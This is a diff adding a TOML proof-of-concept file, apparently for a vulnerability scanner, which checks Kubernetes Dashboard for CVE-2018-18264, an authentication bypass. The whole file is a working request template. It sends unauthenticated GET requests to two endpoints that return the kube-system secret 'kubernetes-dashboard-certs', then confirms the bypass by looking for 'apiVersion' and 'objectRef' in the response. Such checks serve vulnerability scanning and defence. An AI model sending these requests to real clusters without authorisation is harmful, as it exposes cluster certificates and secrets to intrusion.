@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "Kubernetes Dashboard <1.10.1 存在身份验证绕过漏洞（CWE-306），未经认证的攻击者可直接访问 /api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs 端点读取集群 Secret 信息。通过检测响应中是否包含 apiVersion 和 objectRef 字段判断漏洞是否存在。"
+id = "POC-AVE-2018-0131"
+name = "Kubernetes Dashboard 身份验证绕过漏洞 PoC"
+severity = "high"
+tags = ["ave-2018-0131"]
+vuln_id = [
+    "CVE-2018-18264",
+    "AVE-2018-0131",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "apiVersion",
+    "objectRef",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/k8s/api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "apiVersion",
+    "objectRef",
+]
